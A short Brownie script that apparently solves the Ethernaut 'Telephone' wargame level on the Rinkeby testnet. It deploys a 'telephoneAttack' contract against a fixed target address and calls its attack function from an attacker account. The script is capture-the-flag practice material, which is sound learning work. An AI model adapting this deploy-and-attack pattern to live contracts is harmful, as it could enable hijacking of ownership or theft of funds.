from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x1D19B031818d0d2ADf2872a5406EE20436AE3aED'

# deploy attacker contract
attacker_contract=telephoneAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    print('attacker_contract:', attacker_contract)
    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee})

   
